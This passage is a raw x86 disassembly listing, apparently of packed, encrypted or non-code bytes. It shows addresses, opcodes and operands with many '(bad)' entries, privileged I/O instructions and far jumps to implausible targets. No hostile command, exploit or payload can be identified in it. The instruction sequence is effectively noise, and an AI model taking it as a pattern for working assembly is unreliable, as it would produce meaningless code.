  40890b:	xor    BYTE PTR [ecx+0x57adc1a4],0xb1
  408912:	cmp    BYTE PTR [eax+0x1735a510],0x20
  408919:	hlt    
  40891a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40891b:	ja     0x4088f6
  40891d:	add    edi,DWORD PTR [ecx]
  40891f:	scas   eax,DWORD PTR es:[edi]
  408920:	mov    dh,0x28
  408922:	xchg   edi,eax
  408923:	xchg   ebp,eax
  408924:	in     al,dx
  408925:	(bad)  
  408926:	jmp    0x892a1d8f
  40892b:	adc    dl,BYTE PTR [ecx+ecx*2]
  40892e:	push   esi
  40892f:	jo     0x40890f
  408931:	jmp    0x408964
  408933:	ins    DWORD PTR es:[edi],dx
  408934:	imul   esp,DWORD PTR [edi],0xffffffb9
  408937:	add    bl,BYTE PTR [esi]
  408939:	cmp    esi,eax
  40893b:	ins    BYTE PTR es:[edi],dx
  40893c:	(bad)  
  40893d:	sbb    eax,DWORD PTR [edx-0x2c]
  408940:	jmp    0x408946
  408942:	push   ecx
  408943:	test   eax,0x9e45d21
  408948:	loop   0x408903
  40894a:	(bad)  
  40894c:	cld    
  40894d:	icebp  
  40894e:	mov    dl,0xde
  408950:	push   edi
  408951:	sar    ebp,cl
  408953:	test   edx,esi
  408955:	cmp    bh,BYTE PTR [esi]
  408957:	sbb    BYTE PTR [eax+0x2c3bb14e],cl
  40895d:	mov    bl,0x73
  40895f:	icebp  
  408960:	add    ebp,0x39
  408963:	jno    0x408962
  408965:	add    BYTE PTR [edi+0x17],0x41
  408969:	mov    al,0x4c
  40896b:	add    eax,0x43b87a81
  408970:	inc    ecx
  408971:	repz fadd QWORD PTR [eax]
  408974:	sbb    DWORD PTR [edi],eax
  408976:	mov    ds:0xe0041e06,al
  40897b:	inc    edi
  40897c:	pop    esi
  40897d:	xor    eax,0xa9728e45
  408982:	test   al,0xa1
  408984:	sbb    DWORD PTR [ebp+0x6134a731],0xffffff9d
  40898b:	pop    ss
  40898c:	jmp    0x408946
  40898e:	outs   dx,DWORD PTR ds:[esi]
  40898f:	mov    ebp,0x55e101c4
  408994:	or     DWORD PTR [ecx-0x6],0xfffffff2
  408998:	outs   dx,BYTE PTR ds:[esi]
  408999:	(bad)  
  40899a:	xchg   esi,eax
  40899b:	aas    
  40899c:	sub    al,0x51
  40899e:	xchg   edx,eax
  40899f:	adc    al,0xf5
  4089a1:	inc    ebx
  4089a2:	mov    ebx,es
  4089a4:	sbb    DWORD PTR [ebp-0x51],esp
  4089a7:	jae    0x408958
  4089a9:	mov    ebp,DWORD PTR [edi+edi*4+0x5e]
  4089ad:	mov    esp,0xd6554d9e
  4089b2:	lods   al,BYTE PTR ds:[esi]
  4089b3:	retf   0x58b
  4089b6:	scas   al,BYTE PTR es:[edi]
  4089b7:	cmp    ebp,DWORD PTR [edi+0x4e]
  4089ba:	pop    edx
  4089bb:	call   0x7adc:0xdfa4aa51
  4089c2:	popa   
  4089c3:	mov    cl,0xaa
  4089c5:	clc    
  4089c6:	pop    esp
  4089c7:	adc    DWORD PTR [edx+0x57f2751e],0xffffff88
  4089ce:	xchg   esp,eax
  4089cf:	lods   al,BYTE PTR ds:[esi]
  4089d0:	dec    ecx
  4089d1:	mov    ebx,0xb5e7738e
  4089d6:	jge    0x408a2f
  4089d8:	mov    al,ds:0x21ef866a
  4089dd:	cli    
  4089de:	sbb    DWORD PTR fs:[eax-0x5f4e36a],esp
  4089e5:	dec    eax
  4089e6:	pop    edx
  4089e7:	fisubr DWORD PTR ds:0xe4ff2115
  4089ed:	lea    ebx,[edx-0x71cf8015]
  4089f3:	dec    eax
  4089f4:	or     BYTE PTR [ebx+ecx*1],0x7d
  4089f8:	rol    DWORD PTR [edx],cl
  4089fa:	clc    
  4089fb:	sub    eax,0xab9b8c2e
  408a00:	ins    DWORD PTR es:[edi],dx
  408a01:	lds    ebx,FWORD PTR [eax]
  408a03:	(bad)  
  408a04:	call   0xd1698542
  408a09:	ins    BYTE PTR es:[edi],dx
  408a0a:	fld    TBYTE PTR [eax*4-0x50c2be05]
  408a11:	ins    BYTE PTR es:[edi],dx
  408a12:	std    
  408a13:	or     esi,DWORD PTR [ebp+ebp*2-0x1a]
  408a17:	mov    esp,DWORD PTR [ebx-0x337e17e9]
  408a1d:	mov    ch,BYTE PTR [ebp-0x6e]
  408a20:	jns    0x408a82
  408a22:	mov    bh,0x60
  408a24:	in     al,0x83
  408a26:	out    dx,eax
  408a27:	dec    esp
  408a28:	sbb    dh,BYTE PTR [esi+0x7b]
  408a2b:	aam    0x47
  408a2d:	mov    WORD PTR [edx+ecx*1-0x45],?
  408a31:	push   ebx
  408a32:	scas   al,BYTE PTR es:[edi]
  408a33:	scas   al,BYTE PTR es:[edi]
  408a34:	cmp    al,ch
  408a36:	popf   
  408a37:	out    dx,al
  408a38:	setge  BYTE PTR [edi+0x3f23d726]
  408a3f:	mov    ebp,0x1dcc188a
  408a44:	aam    0x89
  408a46:	mov    bl,0xea
  408a48:	jns    0x408a3e
  408a4a:	xchg   ecx,eax
  408a4b:	out    dx,eax
  408a4c:	lea    esi,[eax+0x4d478a7b]
  408a52:	push   esp
  408a53:	stos   BYTE PTR es:[edi],al
  408a54:	sub    DWORD PTR [ebp+0xb8a427c],esi
  408a5a:	popw   ss
  408a5c:	push   edx
  408a5e:	rol    esp,1
  408a60:	jp     0x408a9f
  408a62:	and    eax,0xca930964
  408a67:	mov    edi,0x414169a5
  408a6c:	ss ja  0x4089f5
  408a6f:	adc    esp,DWORD PTR [edi]
  408a71:	mov    ch,0x31
  408a73:	sti    
  408a74:	popa   
  408a75:	mov    eax,0x38584668
  408a7a:	and    eax,0x8d46bc5d
  408a7f:	pop    edi
  408a80:	push   0xdd58a3f6
  408a85:	sub    BYTE PTR [ebx],ch
  408a87:	mov    ebp,0x3932916
  408a8c:	jmp    0x408a8b
  408a8e:	jp     0x408af2
  408a90:	jbe    0x408ad3
  408a92:	(bad)  
  408a93:	sbb    ecx,DWORD PTR [ebx-0x78caedee]
  408a99:	fwait
  408a9a:	adc    esi,DWORD PTR [eax-0x3f3f8d2e]
  408aa0:	repnz or eax,0xa568987f
  408aa6:	inc    ecx
  408aa7:	jns    0x408a52
  408aa9:	mov    ds:0xe30310c1,al
  408aae:	fmul   DWORD PTR [esi]
  408ab0:	icebp  
  408ab1:	jg     0x408b20
  408ab3:	jge    0x408b32
  408ab5:	mov    al,0xad
  408ab7:	loopne 0x408af1
  408ab9:	fdiv   st,st(5)
  408abb:	adc    eax,0xf5e89992
  408ac0:	inc    ecx
  408ac1:	sub    ebp,0x7e
  408ac4:	mov    DWORD PTR [eax+0x5f109e8f],0xf95749d9
  408ace:	mov    ds:0xc83b498b,eax
  408ad3:	jno    0x408afd
  408ad5:	dec    eax
  408ad6:	jo     0x408a65
  408ad8:	ins    DWORD PTR es:[edi],dx
  408ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ada:	sbb    al,0x33
  408adc:	sbb    eax,0x64aa068f
  408ae1:	out    dx,al
  408ae2:	es nop
  408ae4:	sub    al,0xe0
  408ae6:	adc    al,0x65
  408ae8:	xchg   edi,eax
  408ae9:	jo     0x408aaf
  408aeb:	mov    ecx,0x9f73271a
  408af0:	out    0x2a,al
  408af2:	es jno 0x408b18
  408af5:	mov    ds:0xed4cff83,al
  408afa:	ror    DWORD PTR [edx],cl
  408afc:	push   ds
  408afd:	mov    esp,ecx
  408aff:	jmp    0xaf0d:0x6b250de
  408b06:	imul   esp,eax,0x9c7fb609
  408b0c:	jo     0x408aa6
  408b0e:	xor    DWORD PTR [eax],edx
  408b10:	sbb    bl,0x65
  408b13:	ins    DWORD PTR es:[edi],dx
  408b14:	popa   
  408b15:	or     al,0x6c
  408b17:	mov    eax,0x1550b885
  408b1c:	xor    BYTE PTR [eax+0x1ae703f0],0x44
  408b23:	add    DWORD PTR [eax],0x8a5c5689
  408b29:	and    cl,BYTE PTR [eax+ebp*8+0x510c0e81]
  408b30:	xchg   ebx,eax
  408b31:	mov    edx,0xf9baf96c
  408b36:	jle    0x408b5b
  408b38:	(bad)  
  408b39:	jmp    0x408ae2
  408b3b:	sbb    al,0x67
  408b3d:	rcr    DWORD PTR [ecx-0xd],1
  408b40:	out    0x47,al
  408b42:	pushf  
  408b43:	push   ebp
  408b44:	or     eax,0x4ed34ffc
  408b49:	icebp  
  408b4a:	add    al,0xab
  408b4c:	xchg   edx,eax
  408b4d:	dec    ebx
  408b4e:	inc    ebp
  408b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b50:	ja     0x408afb
  408b52:	or     al,0x36
  408b54:	mov    cl,BYTE PTR [edx+0x32]
  408b57:	xor    dl,BYTE PTR [ebx]
  408b59:	clc    
  408b5a:	fwait
  408b5b:	mov    al,0x7f
  408b5d:	jnp    0x408b0f
  408b5f:	or     al,0xed
  408b61:	in     al,dx
  408b62:	sahf   
  408b63:	mov    bh,0xa
  408b65:	sub    dh,al
  408b67:	inc    esi
  408b68:	add    ch,dh
  408b6a:	arpl   WORD PTR [edi],bx
  408b6c:	xor    al,0x2d
  408b6e:	(bad)  
  408b6f:	(bad)  
  408b70:	sti    
  408b71:	sbb    ah,BYTE PTR [esi+0x5e]
  408b74:	das    
  408b75:	fbstp  TBYTE PTR [eax+0xfb97683]
  408b7b:	cli    
  408b7c:	sbb    bl,BYTE PTR [ecx]
  408b7e:	ins    BYTE PTR es:[edi],dx
  408b7f:	mov    WORD PTR [ebx+0x28],?
  408b82:	mov    ebp,DWORD PTR [eax+0x539e090]
  408b88:	adc    DWORD PTR [esi+ebp*4+0x58],esp
  408b8c:	dec    eax
  408b8d:	pop    es
  408b8e:	inc    edi
  408b8f:	(bad)  
  408b90:	shr    BYTE PTR [ebx],cl
  408b92:	or     ebp,DWORD PTR [eax-0xd4b0433]
  408b98:	pop    esp
  408b99:	dec    ebp
  408b9a:	adc    al,0xa3
  408b9c:	pop    esp
  408b9d:	retf   0x3011
  408ba0:	fild   QWORD PTR ds:0x5b6e26c9
  408ba6:	retf   0x9ee5
  408ba9:	and    edi,ebp
  408bab:	mov    ch,0x6c
  408bad:	mov    bl,0x6
  408baf:	cdq    
  408bb0:	push   ebx
  408bb1:	in     al,0xdd
  408bb3:	in     al,dx
  408bb4:	enter  0x7d4e,0xaf
  408bb8:	lahf   
  408bb9:	push   eax
  408bba:	ret    
  408bbb:	sbb    ah,BYTE PTR [ebx+0x5b]
  408bbe:	outs   dx,DWORD PTR ds:[esi]
  408bbf:	xor    bh,bh
  408bc1:	push   es
  408bc2:	ret    
  408bc3:	push   es
  408bc4:	mov    dh,0xc9
  408bc6:	je     0x408b8e
  408bc8:	add    eax,0x720b92cf
  408bcd:	inc    esi
  408bce:	(bad)  
  408bcf:	adc    DWORD PTR ss:[eax],eax
  408bd2:	xor    dl,BYTE PTR es:[esi]
  408bd5:	jne    0x408b7b
  408bd7:	pop    ebx
  408bd8:	inc    ebp
  408bd9:	enter  0x1f2e,0x71
  408bdd:	daa    
  408bde:	or     eax,0x932346c
  408be3:	jno    0x408bf9
  408be5:	(bad)  
  408be6:	inc    eax
  408be7:	dec    esp
  408be8:	retf   0xdff0
  408beb:	data16 sti 
  408bed:	xchg   ecx,eax
  408bee:	mov    ds:0x42599ff4,eax
  408bf3:	cdq    
  408bf4:	imul   eax,ebx,0xffffff81
  408bf7:	or     esi,esi
  408bf9:	sbb    DWORD PTR [edi],esp
  408bfb:	xor    al,0xef
  408bfd:	lock inc ebp
  408bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c00:	call   0x2460:0xd381209c
  408c07:	xor    eax,0xfdf8730e
  408c0c:	inc    edx
  408c0d:	cmp    bl,BYTE PTR [esi+ecx*4]
  408c10:	shl    BYTE PTR [edx+edi*4-0x34],cl
  408c14:	or     eax,0x79bdf877
  408c19:	xchg   esi,eax
  408c1a:	lock ret 0xa9a0
  408c1e:	ss mov bl,0x55
  408c21:	test   eax,ecx
  408c23:	add    eax,0x3790aa2f
  408c28:	jb     0x408bbe
  408c2a:	xor    bl,BYTE PTR [ebx]
  408c2c:	ss sbb eax,0x3121613e
  408c32:	adc    dh,BYTE PTR [edi]
  408c34:	lods   al,BYTE PTR ds:[esi]
  408c35:	pushf  
  408c36:	daa    
  408c37:	push   esp
  408c38:	xchg   esi,eax
  408c39:	cwde   
  408c3a:	xchg   edx,eax
  408c3b:	push   edi
  408c3c:	fnstsw WORD PTR [ecx+0x77]
  408c3f:	retf   0xcf45
  408c42:	inc    ebp
  408c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c44:	or     ah,BYTE PTR [ebx]
  408c46:	mov    ebp,0x51fb6337
  408c4b:	and    ah,BYTE PTR [ebp+0x13f3fc6]
  408c51:	push   ebp
  408c52:	dec    ebx
  408c53:	or     ah,BYTE PTR [ebp+0x79bafb2f]
  408c59:	imul   edx,DWORD PTR [ecx+0x45f6c8d8],0x661c7969
  408c63:	add    ch,bh
  408c65:	call   0x8df6:0xfab79934
  408c6c:	sub    bh,al
  408c6e:	xor    BYTE PTR [ebp-0x35f01531],bl
  408c74:	(bad)  
  408c75:	enter  0xbd95,0x0
  408c79:	sar    bl,1
  408c7b:	lock loop 0x408cb5
  408c7e:	icebp  
  408c7f:	pusha  
  408c80:	dec    edx
  408c81:	das    
  408c82:	sub    al,0x31
  408c84:	mov    WORD PTR [edx+0x3],?
  408c87:	mov    bh,0xfb
  408c89:	fs js  0x408d01
  408c8c:	pop    ss
  408c8d:	shl    BYTE PTR [edi],1
  408c8f:	adc    BYTE PTR [eax-0x30],0xc7
  408c93:	xchg   DWORD PTR [ecx],esp
  408c95:	add    eax,0x5207a05d
  408c9a:	into   
  408c9b:	sub    bh,BYTE PTR [esi]
  408c9d:	xchg   BYTE PTR [ebx+0x35],ah
  408ca0:	int    0x9b
  408ca2:	out    0x41,eax
  408ca4:	pop    eax
  408ca5:	pop    edx
  408ca6:	sbb    ah,BYTE PTR [ecx]
  408ca8:	es nop
  408caa:	xchg   edi,eax
  408cab:	xchg   esp,eax
  408cac:	(bad)  
  408cad:	dec    ebp
  408cae:	out    dx,eax
  408caf:	xchg   ebx,eax
  408cb0:	inc    eax
  408cb1:	cmp    BYTE PTR ds:0x77e141c8,ah
  408cb7:	shl    DWORD PTR [esi],cl
  408cb9:	mov    ah,0x82
  408cbb:	lods   eax,DWORD PTR ds:[esi]
  408cbc:	arpl   WORD PTR [edi],di
  408cbe:	push   esi
  408cbf:	(bad)  
  408cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc4:	cld    
  408cc5:	sub    BYTE PTR ds:[edi+0x3cf6708f],0x23
  408ccd:	scas   eax,DWORD PTR es:[edi]
  408cce:	lds    eax,FWORD PTR [eax-0x4e7ecf4d]
  408cd4:	loopne 0x408c58
  408cd6:	mov    eax,0x561cc815
  408cdb:	push   0x36
  408cdd:	inc    ebx
  408cde:	mov    ebx,0x9b10e48c
  408ce3:	es pop es
  408ce5:	pushf  
  408ce6:	js     0x408ca0
  408ce8:	inc    esi
  408ce9:	fist   DWORD PTR [ebp-0x41]
  408cec:	push   esi
  408ced:	imul   esp,DWORD PTR [edi-0x41936fe7],0xffffffda
  408cf4:	pop    edi
  408cf5:	or     DWORD PTR [edi+0x553c8494],esp
  408cfb:	(bad)  
  408cfc:	retf   
  408cfd:	leave  
  408cfe:	jmp    0x408d41
  408d00:	mov    dl,0x54
  408d02:	inc    eax
  408d03:	pop    ds
  408d04:	xor    edx,ebp
  408d06:	pop    edi
  408d07:	mov    dh,0x33
  408d09:	lea    eax,[eax+0x38687732]
  408d0f:	xchg   DWORD PTR [ecx-0x7ba9912d],esp
  408d15:	repz data16 loope 0x408ca3
  408d19:	bound  ecx,QWORD PTR [edi]
  408d1b:	cdq    
  408d1c:	jl     0x408d07
  408d1e:	dec    esp
  408d1f:	mov    ah,0xf2
  408d21:	sbb    BYTE PTR [esi+0x1],0x8
  408d25:	and    BYTE PTR [ebx-0x6b],cl
  408d28:	jae    0x408d81
  408d2a:	mov    ch,ch
  408d2c:	mov    dl,0x38
  408d2e:	xlat   BYTE PTR ds:[ebx]
  408d2f:	xchg   esp,eax
  408d30:	jno    0x408cf5
  408d32:	cld    
  408d33:	ss jo  0x408d78
  408d36:	mov    ecx,0x19339a11
  408d3b:	scas   al,BYTE PTR es:[edi]
  408d3c:	mov    ah,0xa7
  408d3e:	not    DWORD PTR [ebx+0x1d7d9fc3]
  408d44:	mov    bh,0x41
  408d46:	mov    al,ds:0xb82e050d
  408d4b:	popa   
  408d4c:	icebp  
  408d4d:	scas   eax,DWORD PTR es:[edi]
  408d4e:	jl     0x408d51
  408d50:	xor    edx,esi
  408d52:	add    BYTE PTR [ebp-0x24fe8d5b],cl
  408d58:	pop    esi
  408d59:	stc    
  408d5a:	popf   
  408d5b:	xchg   BYTE PTR [eax-0x77e4d09f],al
  408d61:	fist   WORD PTR [edx-0x20]
  408d64:	xchg   edi,eax
  408d65:	sub    BYTE PTR [ebx+0x5a],0xec
  408d69:	mov    al,0x64
  408d6b:	pcmpeqb mm1,QWORD PTR gs:[edx+0x7b]
  408d70:	xlat   BYTE PTR ds:[ebx]
  408d71:	test   ecx,esp
  408d73:	shr    edx,1
  408d75:	mov    fs,WORD PTR [edx+0xd178a4e]
  408d7b:	aam    0xf2
  408d7d:	pop    esp
  408d7e:	xchg   DWORD PTR [ebp-0x29],eax
  408d81:	dec    edx
  408d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d83:	out    dx,al
  408d84:	push   cs
  408d85:	mov    esi,0x3606014a
  408d8a:	or     BYTE PTR [ebp+esi*2+0x36],0xa8
  408d8f:	mov    edi,ebx
  408d91:	es neg cx
  408d95:	add    ecx,esp
  408d97:	rcr    BYTE PTR fs:[ecx-0x2f1ec0e1],0xbe
  408d9f:	jo     0x408df5
  408da1:	add    dl,BYTE PTR [ecx+0xb]
  408da4:	and    al,0x77
  408da7:	push   0xca2af45d
  408dac:	jmp    0x3236aaa7
  408db1:	push   eax
  408db2:	clc    
  408db3:	out    dx,eax
  408db4:	es pusha 
  408db6:	inc    eax
  408db7:	jge    0x408dca
  408db9:	inc    ebx
  408dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dbb:	cmp    dl,BYTE PTR [edi+0x264a208]
  408dc1:	jo     0x408d72
  408dc3:	in     al,0xe6
  408dc5:	adc    esp,DWORD PTR [edi+eiz*4-0x57ed5419]
  408dcc:	(bad)
  408dcf:	sahf   
  408dd0:	adc    eax,0xb9613155
  408dd5:	xchg   esi,eax
  408dd6:	mov    ds:0x72be462c,al
  408ddb:	inc    eax
  408ddc:	xchg   esp,eax
  408ddd:	jle    0x408e5d
  408ddf:	pushf  
  408de0:	mov    esp,0x4339a807
  408de5:	data16 jcxz 0x408e27
  408de9:	addr16 adc al,0xad
  408dec:	pop    es
  408ded:	loop   0x408d99
  408def:	adc    DWORD PTR [edi-0x21247122],esp
  408df5:	jno    0x408d7c
  408df7:	arpl   di,si
  408df9:	bound  ebp,QWORD PTR [ebx+0x17]
  408dfc:	dec    ebx
  408dfd:	mov    es,esp
  408dff:	and    al,0x47
  408e01:	loope  0x408e3c
  408e03:	and    esp,DWORD PTR [ecx+0x32]
  408e06:	mov    esp,0x6f6e22fa
  408e0b:	sbb    DWORD PTR [esi-0x39455d3f],edi
  408e11:	inc    ebx
  408e12:	lds    ebx,FWORD PTR [edx]
  408e14:	arpl   WORD PTR [esi+ecx*2-0x5d5eb443],si
  408e1b:	stos   BYTE PTR es:[edi],al
  408e1c:	mov    BYTE PTR [esi],ch
  408e1e:	or     DWORD PTR ds:0x5d6b5cf4,esi
  408e24:	xchg   esp,eax
  408e25:	adc    dh,BYTE PTR [ebx+eax*2-0x49]
  408e29:	pop    ebp
  408e2a:	push   0xffffff95
  408e2c:	push   esi
  408e2d:	sbb    al,0x7b
  408e2f:	gs loop 0x408e8a
  408e32:	test   ebp,edx
  408e34:	dec    ecx
  408e35:	and    ebx,DWORD PTR [eax-0x68]
  408e38:	(bad)  
  408e39:	xor    eax,0x16fd08bc
  408e3e:	inc    ecx
  408e3f:	jle    0x408e4b
  408e41:	xor    eax,esp
  408e43:	(bad)  
  408e44:	or     edi,DWORD PTR [edx-0x29]
  408e47:	dec    ebx
  408e48:	arpl   bx,si
  408e4a:	jmp    0x5e46de1a
  408e4f:	sbb    al,0x8
  408e51:	fnstcw WORD PTR [edi+eiz*4-0xd]
  408e55:	mov    edx,0x457f43a9
  408e5a:	shr    edi,1
  408e5c:	test   al,0x8e
  408e5e:	mov    esp,0xcc3d5ad4
  408e63:	shl    BYTE PTR [edi],cl
  408e65:	inc    edx
  408e66:	shr    esp,cl
  408e68:	div    DWORD PTR [ebp+0x16]
  408e6b:	push   ecx
  408e6c:	adc    eax,0xec876555
  408e71:	xchg   esi,esp
  408e73:	pop    es
  408e74:	in     eax,0xe1
  408e76:	inc    ebp
  408e77:	xor    BYTE PTR [edi-0x1cae0111],cl
  408e7d:	in     eax,0xbd
  408e7f:	test   BYTE PTR [esi+0x2],al
  408e82:	mov    dl,0xab
  408e84:	aad    0xcc
  408e86:	cwde   
  408e87:	out    dx,eax
  408e88:	jo     0x408eff
  408e8a:	xchg   ebx,eax
  408e8b:	jl     0x408e46
  408e8d:	adc    al,BYTE PTR [eax-0x59cdbc9d]
  408e93:	add    bh,ah
  408e95:	pop    ecx
  408e96:	adc    eax,0x78e749b9
  408e9b:	enter  0xfd43,0xbb
  408e9f:	push   edi
  408ea0:	(bad)  [edx-0x55]
  408ea3:	push   0xffffff88
  408ea5:	in     eax,0x21
  408ea7:	sub    BYTE PTR [edx+0x23],dl
  408eaa:	cmp    al,BYTE PTR [ebx-0x59]
  408ead:	inc    esi
  408eae:	out    dx,eax
  408eaf:	push   0xcef209d9
  408eb4:	pop    edi
  408eb5:	sub    ebx,DWORD PTR [ebx-0x46]
  408eb8:	inc    esi
  408eb9:	loope  0x408eb0
  408ebb:	ficom  DWORD PTR gs:[ecx+ebx*1-0x7e]
  408ec0:	mov    ?,WORD PTR [esi+0x58fc5996]
  408ec6:	dec    edi
  408ec7:	and    bl,BYTE PTR [edi-0x10b23e82]
  408ecd:	mov    esp,DWORD PTR [ebp-0x76]
  408ed0:	out    dx,eax
  408ed1:	jle    0x408e95
  408ed3:	mov    ah,0xb7
  408ed5:	mov    al,ds:0xf3b0280
  408eda:	stc    
  408edb:	sub    BYTE PTR [edi-0x3a],bh
  408ede:	inc    esp
  408edf:	in     eax,0xe9
  408ee1:	xor    al,0x67
  408ee3:	shl    DWORD PTR [edx+0x11],1
  408ee6:	scas   eax,DWORD PTR es:[edi]
  408ee7:	shl    bl,cl
  408ee9:	out    0x14,al
  408eeb:	add    BYTE PTR [eax-0x9],bh
  408eee:	dec    ebx
  408eef:	test   eax,0xe2d0b513
  408ef4:	js     0x408f36
  408ef6:	scas   al,BYTE PTR es:[edi]
  408ef7:	sub    edx,DWORD PTR [eax+0x722b8762]
  408efd:	lds    edx,FWORD PTR [edx-0x15]
  408f00:	in     al,dx
  408f01:	pop    edi
  408f02:	scas   al,BYTE PTR es:[edi]
  408f03:	retf   0xe3fa
  408f06:	mov    edx,0xda3c156d
  408f0b:	int    0x60
  408f0d:	fsubr  DWORD PTR [edi-0x32c53934]
  408f13:	fdivr  QWORD PTR [esi-0x4fa2882a]
  408f19:	jl     0x408f69
  408f1b:	jb     0x408efa
  408f1d:	fcom   QWORD PTR [ebx]
  408f1f:	push   edi
  408f20:	jmp    0x2830a746
  408f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f26:	mov    esi,0x58ad0de3
  408f2b:	imul   ebx,edi,0x8079675c
  408f31:	imul   esp,DWORD PTR [edx+0x64e81519],0x4299626
  408f3b:	pop    ds
  408f3c:	int3   
  408f3d:	frstor ds:0x6139b420
  408f43:	lea    edx,[ebx+edx*2]
  408f46:	xchg   edx,eax
  408f47:	sbb    dh,bl
  408f49:	lock mov bh,0x2e
  408f4c:	mov    BYTE PTR [eax+eiz*4],al
  408f4f:	gs xchg ebp,eax
  408f51:	push   0x4cd2de17
  408f56:	push   ebx
  408f57:	mov    ebx,0xfbda6e84
  408f5c:	push   esi
  408f5d:	sbb    eax,0xd870ad66
  408f62:	dec    esp
  408f63:	fmul   QWORD PTR [edx]
  408f65:	test   eax,0x33a9ab1e
  408f6a:	jae    0x408fc7
  408f6c:	xor    esp,DWORD PTR [edx]
  408f6e:	outs   dx,DWORD PTR ds:[esi]
  408f6f:	repz je 0x408f23
  408f72:	mov    ds:0x6ad6ee99,eax
  408f77:	xor    bh,ch
  408f79:	mov    ecx,0xc17c7329
  408f7e:	cli    
  408f7f:	and    eax,0x875aecf7
  408f84:	cmp    al,0x62
  408f86:	sub    al,0xd6
  408f88:	pushf  
  408f89:	je     0x408f17
  408f8b:	addr16 cli 
  408f8d:	in     eax,0x60
  408f8f:	jmp    0x55d65048
  408f94:	fwait
  408f95:	dec    ebx
  408f96:	add    eax,0x6affa523
  408f9b:	mov    ds:0x537b5b36,eax
  408fa0:	xor    edx,DWORD PTR [eax-0x79]
  408fa3:	(bad)  
  408fa4:	sbb    edx,DWORD PTR [esp+ecx*4+0x1f964e56]
  408fab:	xor    al,0x60
  408fad:	lahf   
  408fae:	loop   0x408fc9
  408fb0:	mov    ebx,0xd94f7134
  408fb5:	call   0x16e4:0x5e2bfbe3
  408fbc:	jmp    0xd12ea644
  408fc1:	fcmovbe st,st(4)
  408fc3:	(bad)  
  408fc5:	pop    ds
  408fc6:	js     0x408fc6
  408fc8:	xor    esp,esp
  408fca:	mov    ah,0x94
  408fcc:	push   cs
  408fcd:	mov    bh,0x63
  408fcf:	push   esi
  408fd0:	test   BYTE PTR [edx+0x76],0xa6
  408fd4:	sub    ebp,DWORD PTR [esi+0x132933a8]
  408fda:	mov    al,0x99
  408fdc:	lahf   
  408fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fde:	xchg   esp,eax
  408fdf:	or     edi,edi
  408fe1:	adc    eax,0x971a5bfb
  408fe6:	into   
  408fe7:	loop   0x409067
  408fe9:	lds    ebx,FWORD PTR [edi]
  408feb:	or     eax,0xc38ad925
  408ff0:	std    
  408ff1:	sub    ebp,DWORD PTR ds:0xc1021ba2
  408ff7:	in     eax,dx
  408ff8:	or     DWORD PTR [esi+0x3e],ebx
  408ffb:	rol    ah,0x99
  408ffe:	sbb    DWORD PTR [eax-0x3757e21a],eax
  409004:	dec    eax
  409005:	addr16 pop edi
  409007:	in     al,dx
  409008:	jl     0x40903f
  40900a:	mov    eax,ss:0x310c8c47
  409010:	push   ebp
  409011:	sbb    DWORD PTR [esi+ebx*8+0x794c33bd],edi
  409018:	pop    ss
  409019:	lods   al,BYTE PTR ds:[esi]
  40901a:	dec    dh
  40901c:	xchg   edi,eax
  40901d:	pop    ebp
  40901e:	test   al,0xd5
  409020:	loop   0x409000
  409022:	(bad)  
  409023:	repnz loope 0x408fae
  409026:	fwait
  409027:	push   ss
  409028:	leave  
  409029:	mov    edi,0x76700da3
  40902e:	mov    bl,0x7c
  409030:	add    DWORD PTR [eax+0x4081cc98],esp
  409036:	mov    eax,ds:0xe1709b5
  40903b:	jmp    0xbff3907e
  409040:	mov    ds:0x1185c666,eax
  409045:	sbb    edi,DWORD PTR [ebx+0xb]
  409048:	cmc    
  409049:	xchg   esi,eax
  40904a:	inc    esi
  40904b:	dec    esp
  40904c:	inc    ebp
  40904d:	sbb    ch,BYTE PTR [ecx+0x664ccb6b]
  409053:	lds    edx,FWORD PTR [eax]
  409055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409056:	out    0x81,eax
  409058:	inc    ebp
  409059:	and    DWORD PTR [ebx-0x42],ebp
  40905c:	and    esi,ecx
  40905e:	mov    WORD PTR [edi+0x2e1c338e],?
  409064:	hlt    
  409065:	das    
  409066:	sub    WORD PTR [eax-0xf],sp
  40906a:	loopne 0x4090da
  40906c:	lods   al,BYTE PTR ds:[esi]
  40906d:	xor    al,0x76
  40906f:	xor    BYTE PTR [eax+0x62604b44],cl
  409075:	mov    ah,0x6
  409077:	sar    esp,0xee
  40907a:	add    BYTE PTR [edi],ch
  40907c:	push   ebx
  40907d:	sub    eax,0x9069efe4
  409082:	cmp    ah,BYTE PTR [eax-0x61fa3af]
  409088:	jno    0x409016
  40908a:	retf   0x8dce
  40908d:	shl    cl,1
  40908f:	in     eax,0x52
  409091:	call   0x8db0:0xae86dc2
  409098:	ror    DWORD PTR [esi+0x40],0x31
  40909c:	loopne 0x4090b2
  40909e:	out    dx,al
  40909f:	mov    bh,0x47
  4090a1:	cs lahf 
  4090a3:	dec    esi
  4090a4:	(bad)  
  4090a5:	jmp    0x1a9b:0xfb2369a8
  4090ac:	or     BYTE PTR [eax],bl
  4090ae:	mov    dl,BYTE PTR [edx+0x1acc4bf4]
  4090b4:	jo     0x40906a
  4090b6:	(bad)  
  4090b7:	out    0x15,al
  4090b9:	sub    eax,0x6dd51da8
  4090be:	call   0xb57b63bb
  4090c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c4:	xor    al,0xde
  4090c6:	push   ebx
  4090c7:	dec    edx
  4090c8:	mov    ecx,0x862ab9c5
  4090cd:	add    esi,DWORD PTR [ecx+0x53f7ef10]
  4090d3:	xchg   ecx,eax
  4090d4:	jo     0x4090c2
  4090d6:	(bad)  
  4090d7:	jmp    0x4d70:0xc8c220db
  4090de:	aas    
  4090df:	mov    cl,0xe3
  4090e1:	xor    eax,0x7f8c90e4
  4090e6:	stos   BYTE PTR es:[edi],al
  4090e7:	fnstsw WORD PTR [ebx+eiz*8-0x23]
